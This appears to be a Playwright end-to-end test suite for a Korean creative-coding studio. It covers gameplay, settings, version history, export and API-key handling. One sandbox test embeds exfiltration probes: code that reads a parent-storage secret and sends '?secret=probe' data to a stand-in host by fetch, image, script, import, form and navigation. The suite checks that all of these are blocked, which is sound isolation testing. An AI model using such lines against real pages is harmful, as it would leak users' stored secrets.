import { test, expect } from '@playwright/test';
import type { FrameLocator, Page } from '@playwright/test';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { createApp } from '../server/app';
import path from 'node:path';
import { createStarter } from '../src/creative/starters';
import { renderArtifact } from '../src/creative/runtime';
import type { Artifact, Work, WorkKind } from '../src/creative/model';

const createdIds: string[] = [];
const runtimeOrigin = 'http://creative-runtime.test';

test.afterEach(async ({ request }) => {
  for (const id of createdIds.splice(0)) {
    const response = await request.delete(`/api/works/${id}`);
    expect([204, 404]).toContain(response.status());
  }
});

function workFrame(page: Page): FrameLocator {
  return page.frameLocator('iframe[title="작품 미리보기"]').frameLocator('[data-artifact-frame]');
}

async function startExample(page: Page): Promise<Work> {
  await page.goto('/');
  const created = page.waitForResponse(response => response.url().endsWith('/api/works') && response.request().method() === 'POST');
  await page.locator('.creative-starter-card').first().click();
  const response = await created;
  expect(response.status()).toBe(201);
  const work = await response.json() as Work;
  createdIds.push(work.id);
  await expect(page.locator('.creative-editor-title strong')).toHaveText(work.title);
  await expect(page.getByText('직접 플레이하는 예시', { exact: false })).toBeVisible();
  return work;
}

async function matchOnePair(game: FrameLocator) {
  const cards = await game.locator('[data-card]:not(:disabled)').evaluateAll(elements => elements.map(element => ({
    id: (element as HTMLElement).dataset.card!, symbol: (element as HTMLElement).dataset.symbol!,
  })));
  const pair = cards.filter(card => card.symbol === cards[0].symbol).slice(0, 2);
  expect(pair).toHaveLength(2);
  await game.locator(`[data-card="${pair[0].id}"]`).click();
  await game.locator(`[data-card="${pair[1].id}"]`).click();
}

test('new default studio creates a playable game, saves settings, preserves versions, reports real runtime errors and exports a playable file', async ({ page, request, context }, testInfo) => {
  const original = await startExample(page);
  const game = workFrame(page);
  await game.getByRole('button', { name: '게임 시작', exact: true }).click();
  await expect(game.locator('[data-card]')).toHaveCount(8);
  await matchOnePair(game);
  await expect(game.locator('#game-score')).toHaveText('10');
  await page.getByRole('button', { name: '빠른 설정', exact: true }).click();
  const newTitle = `E2E 창작 게임 ${Date.now()}`;
  await page.getByLabel('작품 이름', { exact: true }).fill(newTitle);
  await page.getByLabel('난이도', { exact: true }).selectOption('easy');
  await page.getByLabel('포인트 색상', { exact: true }).evaluate(element => {
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')!.set!.call(element, '#2468ac');
    element.dispatchEvent(new Event('input', { bubbles: true }));
  });
  const savedResponse = page.waitForResponse(response => response.url().endsWith(`/api/works/${original.id}/artifact`) && response.request().method() === 'PATCH');
  await page.getByRole('button', { name: '설정 저장', exact: true }).click();
  expect((await savedResponse).status()).toBe(200);
  await expect(page.locator('.creative-editor-title strong')).toHaveText(newTitle);
  let current = await (await request.get(`/api/works/${original.id}`)).json() as Work;
  expect(current.artifact.settings).toEqual({ accent: '#2468ac', difficulty: 'easy' });
  expect(current.artifact.origin).toBe('starter');
  expect(current.versions).toHaveLength(2);
  await workFrame(page).getByRole('button', { name: '게임 시작', exact: true }).click();
  await expect(workFrame(page).locator('[data-card]')).toHaveCount(6);
  await page.reload();
  await page.getByRole('button', { name: /^내 작품/ }).click();
  await page.locator('.creative-work-open').filter({ has: page.getByRole('heading', { name: newTitle, exact: true }) }).click();
  await expect(page.locator('.creative-editor-title strong')).toHaveText(newTitle);
  const srcdoc = await page.locator('iframe[title="작품 미리보기"]').getAttribute('srcdoc');
  const channel = srcdoc!.match(/const channel="([^"]+)"/)?.[1];
  expect(channel).toBeTruthy();
  await page.evaluate(channel => new Promise<void>(resolve => {
    const done = (event: MessageEvent) => {
      if (event.data?.message !== 'forged-runtime-error') return;
      window.removeEventListener('message', done);
      resolve();
    };
    window.addEventListener('message', done);
    window.postMessage({ type: 'dduk-runtime-error', channel, message: 'forged-runtime-error' }, '*');
  }), channel);
  await expect(page.locator('.creative-runtime-error')).toHaveCount(0);
  await page.getByRole('button', { name: '코드', exact: true }).click();
  await page.getByRole('button', { name: 'JS', exact: true }).click();
  await page.getByRole('textbox', { name: 'JS 코드', exact: true }).fill(`${current.artifact.js}\nthrow new Error("E2E actual runtime error");`);
  await page.getByRole('button', { name: '코드 저장 후 실행', exact: true }).click();
  await expect(page.locator('.creative-runtime-error')).toContainText('E2E actual runtime error');
  const status = await (await request.get('/api/creative/status')).json();
  if (!status.configured) {
    await page.getByRole('button', { name: 'AI로 이 오류 수정', exact: true }).click();
    const connection = page.getByRole('dialog');
    await expect(connection).toContainText('AI가 아직 연결되지 않았습니다');
    const keyInput = connection.getByLabel('API 키', { exact: true });
    await expect(keyInput).toHaveAttribute('type', 'password');
    const fakeKey = 'test-draft-key-never-send-or-store';
    await keyInput.fill(fakeKey);
    await connection.getByRole('button', { name: 'AI 연결 창 닫기', exact: true }).click();
    expect(await page.evaluate(key => Object.values(localStorage).some(value => value.includes(key)), fakeKey)).toBe(false);
  }
  await page.getByRole('button', { name: '변경 기록', exact: true }).click();
  await expect(page.locator('.creative-versions > div')).toHaveCount(3);
  await page.locator('.creative-versions > div').last().getByRole('button', { name: '이 버전으로 복원', exact: true }).click();
  await expect(page.locator('.creative-versions > div')).toHaveCount(4);
  await expect(page.locator('.creative-runtime-error')).toHaveCount(0);
  current = await (await request.get(`/api/works/${original.id}`)).json() as Work;
  expect(current.artifact).toEqual(original.artifact);
  const downloadEvent = page.waitForEvent('download');
  await page.getByRole('button', { name: '실행 파일 받기', exact: true }).click();
  const download = await downloadEvent;
  const output = testInfo.outputPath('creative-playable-game.html');
  await download.saveAs(output);
  const html = await readFile(output, 'utf8');
  const blob = await page.evaluate(html => URL.createObjectURL(new Blob([html], { type: 'text/html' })), html);
  const standalone = await context.newPage();
  await standalone.goto(blob);
  await expect(standalone.getByRole('heading', { name: original.artifact.title, exact: true })).toBeVisible();
  const exportedGame = standalone.frameLocator('[data-artifact-frame]');
  await exportedGame.getByRole('button', { name: '게임 시작', exact: true }).click();
  await matchOnePair(exportedGame);
  await expect(exportedGame.locator('#game-score')).toHaveText('10');
  await standalone.close();
});

test.describe('actual starter interactions in a mobile sandbox', () => {
  test.use({ viewport: { width: 390, height: 844 }, hasTouch: true });

  async function openRuntime(page: Page, kind: WorkKind, artifact?: Artifact) {
    const html = renderArtifact(artifact || createStarter(kind, '실제로 조작하는 작품', '직접 조작하는 예시'), { channel: `runtime-${kind}` });
    await page.route(`${runtimeOrigin}/**`, route => route.fulfill({ status: 200, contentType: 'text/html', body: html }));
    await page.goto(runtimeOrigin);
    const frame = page.frameLocator('[data-artifact-frame]');
    await expect(frame.locator('body')).toBeVisible();
    return frame;
  }

  test('memory game supports touch scoring, winning, losing and restarting', async ({ page }) => {
    const game = await openRuntime(page, 'game');
    await game.getByRole('button', { name: '게임 시작', exact: true }).tap();
    for (let pair = 0; pair < 4; pair++) await matchOnePair(game);
    await expect(game.locator('#game-score')).toHaveText('40');
    await expect(game.locator('#game-status')).toContainText('성공');
    await game.getByRole('button', { name: '다시 시작', exact: true }).tap();
    await expect(game.locator('#game-score')).toHaveText('0');
    const cards = await game.locator('[data-card]').evaluateAll(elements => elements.map(element => ({
      id: (element as HTMLElement).dataset.card!, symbol: (element as HTMLElement).dataset.symbol!,
    })));
    const wrong = [cards[0], cards.find(card => card.symbol !== cards[0].symbol)!];
    for (let life = 3; life >= 0; life--) {
      await game.locator(`[data-card="${wrong[0].id}"]`).tap();
      await game.locator(`[data-card="${wrong[1].id}"]`).tap();
      await expect(game.locator('#game-lives')).toHaveText(String(life));
      if (life > 0) await expect(game.locator('.flipped')).toHaveCount(0);
    }
    await expect(game.locator('#game-status')).toContainText('찾지 못했어요');
    await expect(game.locator('[data-card]:not(:disabled)')).toHaveCount(0);
    await game.getByRole('button', { name: '다시 시작', exact: true }).tap();
    await expect(game.locator('#game-lives')).toHaveText('4');
  });

  test('story choices reach an ending and restart the actual story', async ({ page }) => {
    const story = await openRuntime(page, 'story');
    await story.getByRole('button', { name: /^편지를 열어본다/ }).tap();
    await expect(story.locator('#story-title')).toHaveText('아직 오지 않은 편지');
    await story.getByRole('button', { name: /^지도를 펼쳐본다/ }).tap();
    await expect(story.locator('#story-title')).toContainText('첫 번째 결말');
    await expect(story.locator('[data-choice]')).toHaveCount(0);
    await story.getByRole('button', { name: '처음부터 다시', exact: true }).tap();
    await expect(story.locator('#story-title')).toHaveText('밤의 우체국');
    await expect(story.locator('[data-choice]')).toHaveCount(2);
  });

  test('simulation responds to controls, actually animates and resets', async ({ page }) => {
    const simulation = await openRuntime(page, 'simulation');
    await simulation.locator('#gravity').focus();
    await simulation.locator('#gravity').press('End');
    await expect(simulation.locator('#gravity-value')).toHaveText('2.5');
    await simulation.getByRole('button', { name: '공 놓기', exact: true }).tap();
    await expect.poll(async () => Number(await simulation.locator('#sim-bounces').innerText())).toBeGreaterThan(0);
    await simulation.getByRole('button', { name: '일시정지', exact: true }).tap();
    await expect(simulation.getByRole('button', { name: '계속', exact: true })).toBeVisible();
    await simulation.getByRole('button', { name: '초기화', exact: true }).tap();
    await expect(simulation.locator('#sim-bounces')).toHaveText('0');
    await expect(simulation.getByRole('button', { name: '공 놓기', exact: true })).toBeVisible();
  });

  test('art canvas fits a phone, draws pixels, toggles mirror mode and clears', async ({ page }) => {
    const art = await openRuntime(page, 'art');
    const canvas = art.locator('#art-canvas');
    expect(await canvas.evaluate(element => element.getBoundingClientRect().width <= window.innerWidth)).toBe(true);
    await canvas.tap({ position: { x: 70, y: 70 } });
    await expect(art.locator('#art-status')).toContainText('1번째 선');
    const painted = () => canvas.evaluate(element => {
      const canvas = element as HTMLCanvasElement;
      return canvas.getContext('2d')!.getImageData(0, 0, canvas.width, canvas.height).data.some((value, index) => index % 4 === 3 && value > 0);
    });
    expect(await painted()).toBe(true);
    await art.getByRole('button', { name: '거울 모드 꺼짐', exact: true }).tap();
    await expect(art.getByRole('button', { name: '거울 모드 켜짐', exact: true })).toHaveAttribute('aria-pressed', 'true');
    await art.getByRole('button', { name: '모두 지우기', exact: true }).tap();
    expect(await painted()).toBe(false);
  });

  test('utility calculates user input instead of displaying a static example', async ({ page }) => {
    const tool = await openRuntime(page, 'tool');
    await tool.locator('#goal-total').fill('2000000');
    await tool.locator('#goal-saved').fill('500000');
    await tool.locator('#goal-monthly').fill('250000');
    await tool.getByRole('button', { name: '목표까지 계산하기', exact: true }).tap();
    await expect(tool.locator('#goal-result')).toHaveText('6개월 후에 만나요');
    await expect(tool.locator('#goal-percent')).toHaveText('25%');
  });

  test('website starter opens actual project details and contact information', async ({ page }) => {
    const website = await openRuntime(page, 'website');
    await website.locator('[data-project="1"]').tap();
    await expect(website.locator('#site-detail')).toBeVisible();
    await expect(website.locator('#site-detail-title')).toHaveText('새로운 시선으로');
    await website.getByRole('button', { name: '닫기', exact: true }).tap();
    await expect(website.locator('#site-detail')).not.toBeVisible();
    await website.getByRole('button', { name: /연락하기/ }).tap();
    await expect(website.locator('#site-status')).toContainText('실제 이메일 주소');
  });
});

test('untrusted creative code cannot read maker storage or send data through resource requests or self-navigation', async ({ page, context }) => {
  const unexpectedRequests: string[] = [];
  const artifact: Artifact = {
    ...createStarter('game', '격리된 실행 검증', '격리 시험'),
    html: '<main><output id="storage-result"></output><button id="network-probe">네트워크 경계 시험</button><button id="navigation-probe">이동 경계 시험</button><output id="results"></output><form action="https://blocked.example/form?secret=probe" method="POST"><button type="submit">양식 경계 시험</button></form></main>',
    css: 'body{padding:20px;color:white;background:#111}button{display:block;padding:20px;margin:10px}',
    js: `const result=document.querySelector('#results');try{document.querySelector('#storage-result').textContent=parent.localStorage.getItem('maker-secret-marker')||'missing';}catch{document.querySelector('#storage-result').textContent='parent-storage-blocked';}document.querySelector('#network-probe').onclick=()=>{fetch('https://blocked.example/fetch?secret=probe').catch(()=>result.dataset.fetchBlocked='true');const image=new Image();image.onerror=()=>result.dataset.imageBlocked='true';image.src='https://blocked.example/image?secret=probe';document.body.appendChild(image);const script=document.createElement('script');script.onerror=()=>result.dataset.scriptBlocked='true';script.src='https://blocked.example/script?secret=probe';document.head.appendChild(script);import('https://blocked.example/module?secret=probe').catch(()=>result.dataset.importBlocked='true');};document.querySelector('#navigation-probe').onclick=()=>{location.href='https://blocked.example/navigate?secret=probe';};`,
  };
  const html = renderArtifact(artifact, { channel: 'network-sandbox-probe' });
  await context.addInitScript(() => { if (window === window.top) localStorage.setItem('maker-secret-marker', 'host-only-secret'); });
  await context.route('**/*', async route => {
    const url = new URL(route.request().url());
    if (url.origin === runtimeOrigin && url.pathname === '/' && route.request().resourceType() === 'document') {
      await route.fulfill({ status: 200, contentType: 'text/html', body: html });
    } else if (url.protocol === 'data:' || url.protocol === 'blob:') await route.continue();
    else { unexpectedRequests.push(`${url.origin}${url.pathname}`); await route.abort('blockedbyclient'); }
  });
  await page.goto(runtimeOrigin);
  const untrusted = page.frameLocator('[data-artifact-frame]');
  await expect(untrusted.locator('#storage-result')).toHaveText('parent-storage-blocked');
  await untrusted.getByRole('button', { name: '네트워크 경계 시험', exact: true }).click();
  const results = untrusted.locator('#results');
  for (const attribute of ['data-fetch-blocked', 'data-image-blocked', 'data-script-blocked', 'data-import-blocked']) await expect(results).toHaveAttribute(attribute, 'true');
  await untrusted.getByRole('button', { name: '양식 경계 시험', exact: true }).click();
  await expect(page.locator('[data-runtime-error]')).toContainText('차단');
  // Chromium replaces a blocked form document with an error page; rerun the
  // isolated artifact before probing a separate self-navigation attempt.
  expect(unexpectedRequests).toEqual([]);
  await page.reload();
  await untrusted.getByRole('button', { name: '이동 경계 시험', exact: true }).click();
  await expect(page.locator('[data-runtime-error]')).toContainText('차단');
  expect(unexpectedRequests).toEqual([]);
  expect(await page.evaluate(() => localStorage.getItem('maker-secret-marker'))).toBe('host-only-secret');
});

test('portable creative studio uses the same playable runtime without claiming a live AI connection', async ({ page, context }) => {
  const html = await readFile(process.env.DDUK_PORTABLE_HTML_PATH || path.resolve('artifacts/ddukttak-preview.html'), 'utf8');
  const requests: string[] = [];
  await context.route('**/*', async route => {
    const url = new URL(route.request().url());
    if (url.origin === 'http://creative-portable.test' && url.pathname === '/' && route.request().resourceType() === 'document') await route.fulfill({ status: 200, contentType: 'text/html', body: html });
    else if (url.protocol === 'data:' || url.protocol === 'blob:') await route.continue();
    else { requests.push(`${url.origin}${url.pathname}`); await route.abort('blockedbyclient'); }
  });
  await page.goto('http://creative-portable.test');
  await page.locator('.creative-starter-card').first().click();
  const game = workFrame(page);
  await game.getByRole('button', { name: '게임 시작', exact: true }).click();
  await matchOnePair(game);
  await expect(game.locator('#game-score')).toHaveText('10');
  await page.getByRole('textbox', { name: 'AI 수정 요청', exact: true }).fill('새로운 게임 규칙을 만들어 주세요.');
  await page.getByRole('button', { name: 'AI에 수정 요청 보내기', exact: true }).click();
  await expect(page.getByRole('dialog')).toContainText('설치 없는 체험판 · AI 미연결');
  await expect(page.getByRole('dialog')).toContainText('이 HTML 파일에는 AI 서버가 포함되어 있지 않습니다');
  await page.getByRole('button', { name: 'AI 연결 창 닫기', exact: true }).click();
  await page.getByRole('button', { name: '작업 공간으로 돌아가기', exact: true }).click();
  await page.locator('.creative-categories button').filter({ hasText: '생활·업무 도구' }).click();
  await page.getByRole('button', { name: '예시로 체험하기', exact: true }).click();
  await page.getByRole('button', { name: '선택한 예시 열기', exact: true }).click();
  await expect(page.locator('.creative-editor-title strong')).toHaveText('저축 목표 달성 계산기');
  await expect(workFrame(page).locator('#goal-form')).toBeVisible();
  expect(requests).toEqual([]);
});


test('full app connects a provider, creates executable AI code and applies an AI edit through the real API', async ({ page }) => {
  const directory = await mkdtemp(path.join(tmpdir(), 'ddukttak-ai-browser-'));
  const fakeKey = 'test-browser-provider-key-not-a-real-credential';
  const providerCalls: { task: string; authorization: string | null }[] = [];
  let generations = 0;
  const app = createApp({
    dataDir: directory, aiKey: '', staticDir: path.resolve('dist'),
    creativeFetch: async (_url, init) => {
      const body = JSON.parse(String(init.body));
      const task = body.response_format ? JSON.parse(body.messages[1].content).task : 'connect';
      providerCalls.push({ task, authorization: new Headers(init.headers).get('authorization') });
      if (task === 'connect') return Response.json({ choices: [{ message: { content: 'OK' } }] });
      generations++;
      const increment = task === 'edit' ? 5 : 1;
      const artifact: Artifact = {
        title: 'AI 응답으로 만든 점수 게임', description: '실제 공급자 응답을 실행하는 통합 검증 작품', instructions: '점수 올리기를 눌러 보세요.',
        html: '<button id="ai-play">점수 올리기</button><output id="ai-score">0</output>',
        css: 'body{padding:30px;background:#222;color:white}button{padding:20px;background:var(--accent)}output{display:block;font-size:30px}',
        js: `let score=0;document.querySelector('#ai-play').addEventListener('click',()=>{score+=${increment};document.querySelector('#ai-score').textContent=String(score);});`,
        origin: 'starter', settings: { accent: '#7755cc', difficulty: 'normal' },
      };
      return Response.json({ choices: [{ message: { content: JSON.stringify(artifact) } }] });
    },
  });
  const server = await new Promise<Server>(resolve => {
    const listener = app.listen(0, '127.0.0.1', () => resolve(listener));
  });
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  try {
    await page.goto(origin);
    await page.getByRole('button', { name: 'OpenAI 연결하기', exact: true }).click();
    const dialog = page.getByRole('dialog');
    await dialog.getByLabel('API 키', { exact: true }).fill(fakeKey);
    await dialog.getByRole('button', { name: '연결하고 응답 확인', exact: true }).click();
    await expect(dialog).toContainText('실제 AI 응답 확인됨');
    await expect(dialog.getByLabel('API 키', { exact: false })).toHaveValue('');
    await dialog.getByRole('button', { name: 'AI 연결 창 닫기', exact: true }).click();
    await expect(page.locator('.creative-connection-pill')).toContainText('OpenAI 연결됨');
    await page.getByLabel('작품 이름', { exact: true }).fill('브라우저 AI 생성 통합 검증');
    await page.getByRole('textbox', { name: '만들고 싶은 작품 설명', exact: true }).fill('누르면 점수가 올라가는 간단한 게임을 만들어 주세요.');
    await page.getByRole('button', { name: 'AI로 작품 만들기', exact: true }).click();
    await expect(page.locator('.creative-editor-title')).toContainText('OpenAI가 생성한 작품');
    const game = workFrame(page);
    await game.getByRole('button', { name: '점수 올리기', exact: true }).click();
    await expect(game.locator('#ai-score')).toHaveText('1');
    await page.getByRole('textbox', { name: 'AI 수정 요청', exact: true }).fill('누를 때마다 점수가 5점씩 올라가게 바꿔 주세요.');
    await page.getByRole('button', { name: 'AI에 수정 요청 보내기', exact: true }).click();
    await expect(game.locator('#ai-score')).toHaveText('0');
    await game.getByRole('button', { name: '점수 올리기', exact: true }).click();
    await expect(game.locator('#ai-score')).toHaveText('5');
    await page.getByRole('button', { name: '변경 기록', exact: true }).click();
    await expect(page.locator('.creative-versions > div')).toHaveCount(2);
    expect(generations).toBe(2);
    expect(providerCalls.map(call => call.task)).toEqual(['connect', 'create', 'edit']);
    expect(providerCalls.every(call => call.authorization === `Bearer ${fakeKey}`)).toBe(true);
    expect(await readFile(path.join(directory, 'works.json'), 'utf8')).not.toContain(fakeKey);
    expect(await page.evaluate(key => Object.values(localStorage).some(value => value.includes(key)), fakeKey)).toBe(false);
  } finally {
    await new Promise<void>((resolve, reject) => {
      server.close(error => error ? reject(error) : resolve());
      server.closeAllConnections();
    });
    await rm(directory, { recursive: true, force: true });
  }
});
